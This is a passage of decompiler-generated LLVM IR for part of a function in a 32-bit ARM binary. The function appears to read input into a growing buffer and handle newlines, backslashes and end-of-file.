  %v2_17af4 = icmp eq i32 %v1_17af0, 0
  store i1 %v2_17af4, i1* %cpsr_z.global-to-local, align 1
  %v1_17af8 = load i32, i32* @r5, align 4
  %v2_17af8 = add i32 %v1_17af8, 4
  %v3_17af8 = inttoptr i32 %v2_17af8 to i32*
  store i32 %v1_17af0, i32* %v3_17af8, align 4
  br i1 %v2_17af4, label %dec_label_pc_17d68, label %dec_label_pc_17b00

dec_label_pc_17b00:                               ; preds = %.thread
  %v0_17b00 = load i32, i32* @r5, align 4
  %v1_17b00 = add i32 %v0_17b00, 20
  %v2_17b00 = inttoptr i32 %v1_17b00 to i32*
  %v3_17b00 = load i32, i32* %v2_17b00, align 4
  %v1_17b04 = or i32 %v3_17b00, 1
  store i32 %v1_17b04, i32* %r3.global-to-local, align 4
  store i32 %v1_17b04, i32* %v2_17b00, align 4
  %v0_17b0c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17b0c

dec_label_pc_17b0c:                               ; preds = %dec_label_pc_17ab8, %dec_label_pc_17b00
  %v1_17b14 = phi i32 [ %v2_17ad4, %dec_label_pc_17ab8 ], [ %v0_17b0c.pre, %dec_label_pc_17b00 ]
  %v1_17b0c = add i32 %v1_17b14, 4
  %v2_17b0c = inttoptr i32 %v1_17b0c to i32*
  %v3_17b0c = load i32, i32* %v2_17b0c, align 4
  store i32 %v3_17b0c, i32* %r2.global-to-local, align 4
  %v4_17b0c = add i32 %v1_17b14, 8
  %v5_17b0c = inttoptr i32 %v4_17b0c to i32*
  %v6_17b0c = load i32, i32* %v5_17b0c, align 4
  %v2_17b10 = add i32 %v6_17b0c, %v3_17b0c
  store i32 %v2_17b10, i32* %r3.global-to-local, align 4
  %v2_17b14 = add i32 %v1_17b14, 12
  %v3_17b14 = inttoptr i32 %v2_17b14 to i32*
  store i32 %v2_17b10, i32* %v3_17b14, align 4
  %v0_17b18 = load i32, i32* @fp, align 4
  store i32 %v0_17b18, i32* @r6, align 4
  br label %dec_label_pc_17b1c

dec_label_pc_17b1c:                               ; preds = %dec_label_pc_17ba8, %dec_label_pc_17b94, %dec_label_pc_17b0c
  %v0_17b24 = phi i32 [ %v0_17b18, %dec_label_pc_17b0c ], [ %v1_17b94, %dec_label_pc_17b94 ], [ %v0_17b24.pre.pre, %dec_label_pc_17ba8 ]
  %v0_17b1c = load i32, i32* @r5, align 4
  %v1_17b1c = add i32 %v0_17b1c, 12
  store i32 %v1_17b1c, i32* %r0.global-to-local, align 4
  %v1_17b20 = inttoptr i32 %v1_17b1c to i32*
  %v2_17b20 = load i32, i32* %v1_17b20, align 4
  store i32 %v2_17b20, i32* %r0.global-to-local, align 4
  %v3_17b20 = add i32 %v0_17b1c, 16
  %v4_17b20 = inttoptr i32 %v3_17b20 to i32*
  %v5_17b20 = load i32, i32* %v4_17b20, align 4
  %v2_17b24 = add i32 %v2_17b20, %v0_17b24
  store i32 %v2_17b24, i32* %r0.global-to-local, align 4
  %v2_17b28 = sub i32 %v5_17b20, %v0_17b24
  %v1_17b2c = inttoptr i32 %v0_17b1c to i32*
  %v2_17b2c = load i32, i32* %v1_17b2c, align 4
  store i32 %v2_17b2c, i32* %r2.global-to-local, align 4
  %v3_17b30 = call i32 @function_1929c(i32 %v2_17b24, i32 %v2_17b28, i32 %v2_17b2c)
  store i32 %v3_17b30, i32* %r0.global-to-local, align 4
  store i32 %v3_17b30, i32* %r4.global-to-local, align 4
  %v2_17b34 = icmp eq i32 %v3_17b30, 0
  store i1 %v2_17b34, i1* %cpsr_z.global-to-local, align 1
  %v0_17b3c = load i32, i32* @r5, align 4
  %v1_17b3c = add i32 %v0_17b3c, 12
  br i1 %v2_17b34, label %dec_label_pc_17b3c, label %dec_label_pc_17b54

dec_label_pc_17b3c:                               ; preds = %dec_label_pc_17b1c
  store i32 %v1_17b3c, i32* %r0.global-to-local, align 4
  %v1_17b40 = inttoptr i32 %v1_17b3c to i32*
  %v2_17b40 = load i32, i32* %v1_17b40, align 4
  store i32 %v2_17b40, i32* %r0.global-to-local, align 4
  %v3_17b40 = add i32 %v0_17b3c, 16
  %v4_17b40 = inttoptr i32 %v3_17b40 to i32*
  %v5_17b40 = load i32, i32* %v4_17b40, align 4
  store i32 %v5_17b40, i32* @r2, align 4
  %v2_17b48 = inttoptr i32 %v2_17b40 to i8*
  %v3_17b48 = call i32 @function_13ed0(i8* %v2_17b48, i32 0)
  store i32 %v3_17b48, i32* %r0.global-to-local, align 4
  %v0_17b4c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17d6c

dec_label_pc_17b54:                               ; preds = %dec_label_pc_17b1c
  %v2_17b54 = inttoptr i32 %v1_17b3c to i32*
  %v3_17b54 = load i32, i32* %v2_17b54, align 4
  store i32 %v3_17b54, i32* @r4, align 4
  %v1_17b58 = load i32, i32* @r6, align 4
  %v2_17b58 = add i32 %v1_17b58, %v3_17b54
  store i32 %v2_17b58, i32* @r0, align 4
  %v0_17b5c = call i32 @function_13f70()
  %v0_17b64 = load i32, i32* @r6, align 4
  %v2_17b64 = add i32 %v0_17b64, %v0_17b5c
  store i32 %v2_17b64, i32* @r6, align 4
  %v0_17b68 = load i32, i32* @r4, align 4
  store i32 %v0_17b68, i32* @r0, align 4
  %v2_17b6c = call i32 @function_142f0(i32 %v0_17b68, i32 10)
  store i32 %v2_17b6c, i32* %r0.global-to-local, align 4
  %v2_17b70 = icmp eq i32 %v2_17b6c, 0
  store i1 %v2_17b70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b70, label %dec_label_pc_17b9c, label %dec_label_pc_17b78

dec_label_pc_17b78:                               ; preds = %dec_label_pc_17b54
  %v1_17b78 = inttoptr i32 %v2_17b6c to i8*
  %v2_17b78 = load i8, i8* %v1_17b78, align 1
  %v3_17b78 = zext i8 %v2_17b78 to i32
  %v1_17b7c = add nuw nsw i32 %v3_17b78, 255
  %v1_17b80 = urem i32 %v1_17b7c, 256
  store i32 %v1_17b80, i32* %r3.global-to-local, align 4
  %v7_17b84 = icmp eq i32 %v1_17b80, 92
  store i1 %v7_17b84, i1* %cpsr_z.global-to-local, align 1
  %v1_17b88 = trunc i32 %v1_17b7c to i8
  store i8 %v1_17b88, i8* %v1_17b78, align 1
  %v0_17b8c = load i32, i32* @r6, align 4
  %v1_17b8c = add i32 %v0_17b8c, -1
  store i32 %v1_17b8c, i32* @r6, align 4
  %v0_17b90 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17b90, label %dec_label_pc_17b94, label %dec_label_pc_17c20

dec_label_pc_17b94:                               ; preds = %dec_label_pc_17b78
  %v1_17b94 = add i32 %v0_17b8c, -2
  store i32 %v1_17b94, i32* @r6, align 4
  br label %dec_label_pc_17b1c

dec_label_pc_17b9c:                               ; preds = %dec_label_pc_17b54
  %v0_17b9c = load i32, i32* @r5, align 4
  %v1_17b9c = add i32 %v0_17b9c, 20
  %v2_17b9c = inttoptr i32 %v1_17b9c to i32*
  %v3_17b9c = load i32, i32* %v2_17b9c, align 4
  store i32 %v3_17b9c, i32* %r3.global-to-local, align 4
  %v2_17ba0 = icmp eq i32 %v3_17b9c, 0
  store i1 %v2_17ba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17ba0, label %dec_label_pc_17bd8, label %dec_label_pc_17ba8

dec_label_pc_17ba8:                               ; preds = %dec_label_pc_17b9c
  %v1_17ba8 = add i32 %v0_17b9c, 16
  %v2_17ba8 = inttoptr i32 %v1_17ba8 to i32*
  %v3_17ba8 = load i32, i32* %v2_17ba8, align 4
  store i32 %v3_17ba8, i32* %r3.global-to-local, align 4
  %v1_17bac = add i32 %v0_17b9c, 8
  %v2_17bac = inttoptr i32 %v1_17bac to i32*
  %v3_17bac = load i32, i32* %v2_17bac, align 4
  %v1_17bb0 = add i32 %v3_17ba8, 4096
  store i32 %v1_17bb0, i32* %r3.global-to-local, align 4
  %v2_17bb4 = add i32 %v3_17bac, %v1_17bb0
  store i32 %v1_17bb0, i32* %v2_17ba8, align 4
  %v0_17bbc = load i32, i32* @r5, align 4
  %v1_17bbc = add i32 %v0_17bbc, 4
  %v2_17bbc = inttoptr i32 %v1_17bbc to i32*
  %v3_17bbc = load i32, i32* %v2_17bbc, align 4
  store i32 %v3_17bbc, i32* %r0.global-to-local, align 4
  %v2_17bc0 = inttoptr i32 %v3_17bbc to i32*
  %v3_17bc0 = call i32 @function_1a744(i32* %v2_17bc0, i32 %v2_17bb4)
  store i32 %v3_17bc0, i32* %r0.global-to-local, align 4
  %v0_17bc4 = load i32, i32* @r5, align 4
  %v1_17bc4 = add i32 %v0_17bc4, 8
  %v2_17bc4 = inttoptr i32 %v1_17bc4 to i32*
  %v3_17bc4 = load i32, i32* %v2_17bc4, align 4
  %v2_17bc8 = add i32 %v3_17bc4, %v3_17bc0
  store i32 %v2_17bc8, i32* %r3.global-to-local, align 4
  %v2_17bcc = add i32 %v0_17bc4, 12
  %v3_17bcc = inttoptr i32 %v2_17bcc to i32*
  store i32 %v2_17bc8, i32* %v3_17bcc, align 4
  %v1_17bd0 = load i32, i32* @r5, align 4
  %v2_17bd0 = add i32 %v1_17bd0, 4
  %v3_17bd0 = inttoptr i32 %v2_17bd0 to i32*
  store i32 %v3_17bc0, i32* %v3_17bd0, align 4
  %v0_17b24.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17b1c

dec_label_pc_17bd8:                               ; preds = %dec_label_pc_17b9c, %.dec_label_pc_17bd8_crit_edge
  %v0_17bd8 = phi i32 [ %v0_17bd8.pre, %.dec_label_pc_17bd8_crit_edge ], [ %v0_17b9c, %dec_label_pc_17b9c ]
  %v1_17bd8 = inttoptr i32 %v0_17bd8 to i32*
  %v2_17bd8 = load i32, i32* %v1_17bd8, align 4
  %v1_17bdc = add i32 %v2_17bd8, 52
  %v2_17bdc = inttoptr i32 %v1_17bdc to i32*
  %v3_17bdc = load i32, i32* %v2_17bdc, align 4
  store i32 %v3_17bdc, i32* %r3.global-to-local, align 4
  %v2_17be0 = icmp eq i32 %v3_17bdc, 0
  store i1 %v2_17be0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17be0, label %dec_label_pc_17c0c, label %dec_label_pc_17be8

dec_label_pc_17be8:                               ; preds = %dec_label_pc_17bd8
  %v1_17be8 = add i32 %v2_17bd8, 16
  %v2_17be8 = inttoptr i32 %v1_17be8 to i32*
  %v3_17be8 = load i32, i32* %v2_17be8, align 4
  store i32 %v3_17be8, i32* %r2.global-to-local, align 4
  %v1_17bec = add i32 %v2_17bd8, 24
  %v2_17bec = inttoptr i32 %v1_17bec to i32*
  %v3_17bec = load i32, i32* %v2_17bec, align 4
  store i32 %v3_17bec, i32* %r3.global-to-local, align 4
  %v3_17bf0 = icmp ult i32 %v3_17be8, %v3_17bec
  %v9_17bf0 = icmp eq i32 %v3_17be8, %v3_17bec
  store i1 %v9_17bf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17bf0, label %dec_label_pc_17c14thread-pre-split, label %dec_label_pc_17c00

dec_label_pc_17c00:                               ; preds = %dec_label_pc_17be8
  store i32 %v2_17bd8, i32* %r0.global-to-local, align 4
  %v1_17c04 = inttoptr i32 %v2_17bd8 to i16*
  %v2_17c04 = call i32 @function_196ec(i16* %v1_17c04)
  store i32 %v2_17c04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c14

dec_label_pc_17c0c:                               ; preds = %dec_label_pc_17bd8
  store i32 %v2_17bd8, i32* %r0.global-to-local, align 4
  %v1_17c10 = call i32 @function_191c0(i32 %v2_17bd8)
  store i32 %v1_17c10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c14

dec_label_pc_17c14thread-pre-split:               ; preds = %dec_label_pc_17be8
  %v2_17bf4 = inttoptr i32 %v3_17be8 to i8*
  %v3_17bf4 = load i8, i8* %v2_17bf4, align 1
  %v4_17bf4 = zext i8 %v3_17bf4 to i32
  store i32 %v4_17bf4, i32* %r0.global-to-local, align 4
  %v6_17bf4 = add i32 %v3_17be8, 1
  store i32 %v6_17bf4, i32* %r2.global-to-local, align 4
  store i32 %v6_17bf4, i32* %v2_17be8, align 4
  %v0_17c14.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c14

dec_label_pc_17c14:                               ; preds = %dec_label_pc_17c14thread-pre-split, %dec_label_pc_17c00, %dec_label_pc_17c0c
  %v1_17c18 = phi i32 [ %v0_17c14.pr, %dec_label_pc_17c14thread-pre-split ], [ %v2_17c04, %dec_label_pc_17c00 ], [ %v1_17c10, %dec_label_pc_17c0c ]
  %v7_17c14 = icmp eq i32 %v1_17c18, 10
  store i1 %v7_17c14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17c14, label %dec_label_pc_17c20.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_17c14
  %v8_17c18 = icmp eq i32 %v1_17c18, -1
  store i1 %v8_17c18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_17c18, label %dec_label_pc_17c20.loopexit, label %.dec_label_pc_17bd8_crit_edge

.dec_label_pc_17bd8_crit_edge:                    ; preds = %bb68
  %v0_17bd8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17bd8

dec_label_pc_17c20.loopexit:                      ; preds = %bb68, %dec_label_pc_17c14
  %v0_17c20.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17c20

dec_label_pc_17c20:                               ; preds = %dec_label_pc_17b78, %dec_label_pc_17c20.loopexit
  %v0_17c20 = phi i32 [ %v0_17c20.pre, %dec_label_pc_17c20.loopexit ], [ %v1_17b8c, %dec_label_pc_17b78 ]
  %v7_17c20 = icmp eq i32 %v0_17c20, -1
  store i1 %v7_17c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17c20, label %dec_label_pc_17d68, label %dec_label_pc_17c28

dec_label_pc_17c28:                               ; preds = %dec_label_pc_17c20
  %v0_17c28 = load i32, i32* @r5, align 4
  %v1_17c28 = add i32 %v0_17c28, 4
  %v2_17c28 = inttoptr i32 %v1_17c28 to i32*
  %v3_17c28 = load i32, i32* %v2_17c28, align 4
  store i32 %v3_17c28, i32* %r0.global-to-local, align 4
  store i32 %v3_17a7c, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_17c28, i32* %v2_17c34, align 4
  %v0_17c38 = load i32, i32* @fp, align 4
  %v2_17c3c = inttoptr i32 %v3_17c28 to i8*
  %v3_17c3c = call i32 @function_13ed0(i8* %v2_17c3c, i32 %v0_17c38)
  store i32 %v3_17c3c, i32* %r0.global-to-local, align 4
  store i32 %v1_17a90, i32* %r2.global-to-local, align 4
  store i1 %v2_17c44, i1* %cpsr_z.global-to-local, align 1
  %v0_17c48 = load i32, i32* @r5, align 4
  %v1_17c48 = add i32 %v0_17c48, 12
  %v2_17c48 = inttoptr i32 %v1_17c48 to i32*
  %v3_17c48 = load i32, i32* %v2_17c48, align 4
  store i32 %v3_17c48, i32* @r4, align 4
  br i1 %v2_17c44, label %dec_label_pc_17c60, label %dec_label_pc_17c50

dec_label_pc_17c50:                               ; preds = %dec_label_pc_17c28
  store i32 %v3_17c48, i32* @r0, align 4
  %v1_17c58 = inttoptr i32 %v3_17c48 to i8*
  %v2_17c58 = call i32 @function_1a08c(i8* %v1_17c58)
  store i32 %v2_17c58, i32* %r0.global-to-local, align 4
  %v0_17c5c = load i32, i32* @r4, align 4
  %v2_17c5c = add i32 %v0_17c5c, %v2_17c58
  store i32 %v2_17c5c, i32* @r4, align 4
  br label %dec_label_pc_17c60

dec_label_pc_17c60:                               ; preds = %dec_label_pc_17c28, %dec_label_pc_17c50
  %v0_17d3813 = phi i32 [ %v3_17c48, %dec_label_pc_17c28 ], [ %v2_17c5c, %dec_label_pc_17c50 ]
  %v1_17c60 = inttoptr i32 %v0_17d3813 to i8*
  %v2_17c60 = load i8, i8* %v1_17c60, align 1
  %v3_17c60 = zext i8 %v2_17c60 to i32
  store i32 %v3_17c60, i32* %r2.global-to-local, align 4
  %v2_17c64 = icmp eq i8 %v2_17c60, 0
  store i1 %v2_17c64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17c64, label %dec_label_pc_17ab8.backedge, label %dec_label_pc_17c6c

dec_label_pc_17ab8.backedge:                      ; preds = %dec_label_pc_17c60, %dec_label_pc_17d60, %dec_label_pc_17c6c
  %v0_17ab8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17ab8

dec_label_pc_17c6c:                               ; preds = %dec_label_pc_17c60
  %v0_17c6c = load i32, i32* @r7, align 4
  %v1_17c6c = inttoptr i32 %v0_17c6c to i8*
  %v2_17c6c = load i8, i8* %v1_17c6c, align 1
  %v3_17c6c = zext i8 %v2_17c6c to i32
  store i32 %v3_17c6c, i32* %r3.global-to-local, align 4
  %v9_17c70 = icmp eq i8 %v2_17c6c, %v2_17c60
  store i1 %v9_17c70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17c70, label %dec_label_pc_17ab8.backedge, label %dec_label_pc_17d38.preheader

dec_label_pc_17d38.preheader:                     ; preds = %dec_label_pc_17c6c
  %v1_17c74 = load i32, i32* @fp, align 4
  store i32 %v1_17c74, i32* @r6, align 4
  %v2_17d3815 = load i8, i8* %v1_17c60, align 1
  %v3_17d3816 = zext i8 %v2_17d3815 to i32
  store i32 %v3_17d3816, i32* %r2.global-to-local, align 4
  %v2_17d3c17 = icmp eq i8 %v2_17d3815, 0
  store i1 %v2_17d3c17, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17d3c17, label %dec_label_pc_17d54, label %dec_label_pc_17d44.preheader

dec_label_pc_17d44.preheader:                     ; preds = %dec_label_pc_17d38.preheader
  %v2_17d4482 = load i8, i8* %v1_17c6c, align 1
  %v3_17d4483 = zext i8 %v2_17d4482 to i32
  store i32 %v3_17d4483, i32* %r3.global-to-local, align 4
  %v9_17d4886 = icmp eq i8 %v2_17d4482, %v2_17d3815
  store i1 %v9_17d4886, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17d4886, label %dec_label_pc_17d54, label %bb74

dec_label_pc_17c80:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_17c84 = load i32, i32* %v2_17c34, align 4
  store i32 %v2_17c84, i32* %r3.global-to-local, align 4
  store i32 %v1_17a94, i32* %r2.global-to-local, align 4
  %v9_17c8c = icmp eq i32 %v2_17c9088, %v1_17a94
  store i1 %v9_17c8c, i1* %cpsr_z.global-to-local, align 1
  %v5_17c90 = mul i32 %v2_17c9088, 4
  %v6_17c90 = add i32 %v2_17c84, %v5_17c90
  %v7_17c90 = inttoptr i32 %v6_17c90 to i32*
  store i32 %v0_17c9087, i32* %v7_17c90, align 4
  br i1 %v9_17c8c, label %dec_label_pc_17c98, label %dec_label_pc_17ca4

dec_label_pc_17c98:                               ; preds = %dec_label_pc_17c80
  store i32 %v1_17aa0, i32* %r3.global-to-local, align 4
  store i1 %v2_17c9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17c9c, label %dec_label_pc_17ca4, label %dec_label_pc_17cc4

dec_label_pc_17ca4:                               ; preds = %dec_label_pc_17c98, %dec_label_pc_17c80
  %v0_17ca4 = load i32, i32* @r7, align 4
  %v1_17ca4 = inttoptr i32 %v0_17ca4 to i8*
  %v2_17ca4 = load i8, i8* %v1_17ca4, align 1
  %v3_17ca4 = zext i8 %v2_17ca4 to i32
  store i32 %v3_17ca4, i32* %r3.global-to-local, align 4
  %v2_17ca8 = icmp eq i8 %v2_17ca4, 0
  store i1 %v2_17ca8, i1* %cpsr_z.global-to-local, align 1
  %v0_17cac = load i32, i32* @r4, align 4
  store i32 %v0_17cac, i32* @r0, align 4
  %v1_17cb0 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_17ca8, i32 %v1_17cb0, i32 %v0_17ca4
  store i32 %storemerge, i32* @r1, align 4
  %v0_17cb8 = call i32 @function_19eb8()
  store i32 %v0_17cb8, i32* %r0.global-to-local, align 4
  %v0_17cbc = load i32, i32* @r4, align 4
  %v2_17cbc = add i32 %v0_17cbc, %v0_17cb8
  store i32 %v2_17cbc, i32* @r4, align 4
  br label %dec_label_pc_17cfc

dec_label_pc_17cc4:                               ; preds = %dec_label_pc_17c98
  %v0_17cc4 = load i32, i32* @r4, align 4
  store i32 %v0_17cc4, i32* @r0, align 4
  %v0_17cc8 = load i32, i32* @r7, align 4
  %v1_17cc8 = inttoptr i32 %v0_17cc8 to i8*
  %v2_17cc8 = load i8, i8* %v1_17cc8, align 1
  %v3_17cc8 = zext i8 %v2_17cc8 to i32
  %v5_17ccc = call i32 @function_1a14c(i32 %v0_17cc4, i32 %v3_17cc8, i32 %v1_17a94, i32 %v1_17aa0)
  store i32 %v5_17ccc, i32* %r0.global-to-local, align 4
  store i32 %v1_17a90, i32* %r2.global-to-local, align 4
  store i1 %v2_17c44, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_17ccc, i32* @r4, align 4
  br i1 %v2_17c44, label %dec_label_pc_17cfc, label %dec_label_pc_17ce8

dec_label_pc_17ce4:                               ; preds = %dec_label_pc_17ce8
  %v1_17ce4 = add i32 %v0_17cfc.pre, -1
  store i32 %v1_17ce4, i32* @r4, align 4
  br label %dec_label_pc_17ce8

dec_label_pc_17ce8:                               ; preds = %dec_label_pc_17cc4, %dec_label_pc_17ce4
  %v0_17ce8 = phi i32 [ %v1_17ce4, %dec_label_pc_17ce4 ], [ %v5_17ccc, %dec_label_pc_17cc4 ]
  %v1_17ce8 = add i32 %v0_17ce8, -1
  %v2_17ce8 = inttoptr i32 %v1_17ce8 to i8*
  %v3_17ce8 = load i8, i8* %v2_17ce8, align 1
  %v4_17ce8 = zext i8 %v3_17ce8 to i32
  %v0_17cec = load i32, i32* @sl, align 4
  store i32 %v0_17cec, i32* @r0, align 4
  %v2_17cf0 = call i32 @function_142f0(i32 %v0_17cec, i32 %v4_17ce8)
  store i32 %v2_17cf0, i32* %r0.global-to-local, align 4
  %v2_17cf4 = icmp eq i32 %v2_17cf0, 0
  store i1 %v2_17cf4, i1* %cpsr_z.global-to-local, align 1
  %v0_17cfc.pre = load i32, i32* @r4, align 4
  br i1 %v2_17cf4, label %dec_label_pc_17cfc, label %dec_label_pc_17ce4

dec_label_pc_17cfc:                               ; preds = %dec_label_pc_17ce8, %dec_label_pc_17cc4, %dec_label_pc_17ca4
  %v3_17d08 = phi i32 [ %v5_17ccc, %dec_label_pc_17cc4 ], [ %v2_17cbc, %dec_label_pc_17ca4 ], [ %v0_17cfc.pre, %dec_label_pc_17ce8 ]
  %v1_17cfc = inttoptr i32 %v3_17d08 to i8*
  %v2_17cfc = load i8, i8* %v1_17cfc, align 1
  %v3_17cfc = zext i8 %v2_17cfc to i32
  store i32 %v3_17cfc, i32* %r2.global-to-local, align 4
  %v0_17d00 = load i32, i32* @r7, align 4
  %v1_17d00 = inttoptr i32 %v0_17d00 to i8*
  %v2_17d00 = load i8, i8* %v1_17d00, align 1
  %v3_17d00 = zext i8 %v2_17d00 to i32
  store i32 %v3_17d00, i32* %r3.global-to-local, align 4
  %v9_17d04 = icmp eq i8 %v2_17d00, %v2_17cfc
  store i1 %v9_17d04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17d04, label %bb71, label %dec_label_pc_17d10

bb71:                                             ; preds = %dec_label_pc_17cfc
  %v1_17d08 = load i32, i32* @fp, align 4
  %v2_17d08 = trunc i32 %v1_17d08 to i8
  store i8 %v2_17d08, i8* %v1_17cfc, align 1
  %v0_17d0c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17d0c.pr, label %bb73, label %.dec_label_pc_17d10_crit_edge

.dec_label_pc_17d10_crit_edge:                    ; preds = %bb71
  %v0_17d10.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d10

dec_label_pc_17d10:                               ; preds = %.dec_label_pc_17d10_crit_edge, %dec_label_pc_17cfc
  %v0_17d10 = phi i32 [ %v0_17d10.pre, %.dec_label_pc_17d10_crit_edge ], [ %v3_17cfc, %dec_label_pc_17cfc ]
  %v2_17d10 = icmp eq i32 %v0_17d10, 0
  store i1 %v2_17d10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17d10, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_17d10
  %v1_17d14 = load i32, i32* @fp, align 4
  %v2_17d14 = trunc i32 %v1_17d14 to i8
  %v3_17d14 = load i32, i32* @r4, align 4
  %v4_17d14 = inttoptr i32 %v3_17d14 to i8*
  store i8 %v2_17d14, i8* %v4_17d14, align 1
  %v5_17d14 = load i32, i32* @r4, align 4
  %v6_17d14 = add i32 %v5_17d14, 1
  store i32 %v6_17d14, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_17d10, %bb72
  %v2_17d18 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_17d18, i32* %r3.global-to-local, align 4
  %v2_17d1c = icmp eq i32 %v2_17d18, 0
  store i1 %v2_17d1c, i1* %cpsr_z.global-to-local, align 1
  %v0_17d38.pre = load i32, i32* @r4, align 4
  br i1 %v2_17d1c, label %dec_label_pc_17d34, label %dec_label_pc_17d24

dec_label_pc_17d24:                               ; preds = %bb73
  store i32 %v0_17d38.pre, i32* @r0, align 4
  %v1_17d2c = inttoptr i32 %v0_17d38.pre to i8*
  %v2_17d2c = call i32 @function_1a08c(i8* %v1_17d2c)
  store i32 %v2_17d2c, i32* %r0.global-to-local, align 4
  %v0_17d30 = load i32, i32* @r4, align 4
  %v2_17d30 = add i32 %v0_17d30, %v2_17d2c
  store i32 %v2_17d30, i32* @r4, align 4
  br label %dec_label_pc_17d34

dec_label_pc_17d34:                               ; preds = %bb73, %dec_label_pc_17d24
  %v0_17d38 = phi i32 [ %v2_17d30, %dec_label_pc_17d24 ], [ %v0_17d38.pre, %bb73 ]
  %v0_17d34 = load i32, i32* @r6, align 4
  %v1_17d34 = add i32 %v0_17d34, 1
  store i32 %v1_17d34, i32* @r6, align 4
  %v1_17d38 = inttoptr i32 %v0_17d38 to i8*
  %v2_17d38 = load i8, i8* %v1_17d38, align 1
  %v3_17d38 = zext i8 %v2_17d38 to i32
  store i32 %v3_17d38, i32* %r2.global-to-local, align 4
  %v2_17d3c = icmp eq i8 %v2_17d38, 0
  store i1 %v2_17d3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17d3c, label %dec_label_pc_17d54, label %dec_label_pc_17d34.dec_label_pc_17d44_crit_edge

dec_label_pc_17d34.dec_label_pc_17d44_crit_edge:  ; preds = %dec_label_pc_17d34
  %v0_17d44.pre = load i32, i32* @r7, align 4
  %v1_17d44 = inttoptr i32 %v0_17d44.pre to i8*
  %v2_17d44 = load i8, i8* %v1_17d44, align 1
  %v3_17d44 = zext i8 %v2_17d44 to i32
  store i32 %v3_17d44, i32* %r3.global-to-local, align 4
  %v9_17d48 = icmp eq i8 %v2_17d44, %v2_17d38
  store i1 %v9_17d48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17d48, label %dec_label_pc_17d54, label %bb74

bb74:                                             ; preds = %dec_label_pc_17d44.preheader, %dec_label_pc_17d34.dec_label_pc_17d44_crit_edge
  %v2_17c9088 = phi i32 [ %v1_17d34, %dec_label_pc_17d34.dec_label_pc_17d44_crit_edge ], [ %v1_17c74, %dec_label_pc_17d44.preheader ]
  %v0_17c9087 = phi i32 [ %v0_17d38, %dec_label_pc_17d34.dec_label_pc_17d44_crit_edge ], [ %v0_17d3813, %dec_label_pc_17d44.preheader ]
  %v2_17d4c = load i32, i32* @sb, align 4
  %v3_17d4c = sub i32 %v2_17c9088, %v2_17d4c
  %v5_17d4c = xor i32 %v2_17d4c, %v2_17c9088
  %v6_17d4c = xor i32 %v3_17d4c, %v2_17c9088
  %v7_17d4c = and i32 %v6_17d4c, %v5_17d4c
  %v8_17d4c = icmp slt i32 %v7_17d4c, 0
  %v9_17d4c = icmp slt i32 %v3_17d4c, 0
  %v10_17d4c = icmp eq i32 %v2_17c9088, %v2_17d4c
  store i1 %v10_17d4c, i1* %cpsr_z.global-to-local, align 1
  %v2_17d50 = xor i1 %v9_17d4c, %v8_17d4c
  br i1 %v2_17d50, label %dec_label_pc_17c80, label %dec_label_pc_17d54

dec_label_pc_17d54:                               ; preds = %dec_label_pc_17d44.preheader, %bb74, %dec_label_pc_17d34, %dec_label_pc_17d34.dec_label_pc_17d44_crit_edge, %dec_label_pc_17d38.preheader
  %v0_17d58 = phi i32 [ %v1_17c74, %dec_label_pc_17d38.preheader ], [ %v1_17c74, %dec_label_pc_17d44.preheader ], [ %v2_17c9088, %bb74 ], [ %v1_17d34, %dec_label_pc_17d34 ], [ %v1_17d34, %dec_label_pc_17d34.dec_label_pc_17d44_crit_edge ]
  store i32 %v3_17a78, i32* %r2.global-to-local, align 4
  %v9_17d58 = icmp eq i32 %v0_17d58, %v3_17a78
  store i1 %v9_17d58, i1* %cpsr_z.global-to-local, align 1
  %v6_17d5c = icmp slt i32 %v0_17d58, %v3_17a78
  br i1 %v6_17d5c, label %dec_label_pc_17d60, label %dec_label_pc_17d6c

dec_label_pc_17d60:                               ; preds = %dec_label_pc_17d54
  %v0_17d60 = load i32, i32* @r8, align 4
  %v1_17d60 = and i32 %v0_17d60, 1048576
  %v2_17d60 = icmp eq i32 %v1_17d60, 0
  store i1 %v2_17d60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17d60, label %dec_label_pc_17ab8.backedge, label %dec_label_pc_17d68

dec_label_pc_17d68:                               ; preds = %dec_label_pc_17d60, %dec_label_pc_17c20, %.thread, %dec_label_pc_17a54
  br label %dec_label_pc_17d6c

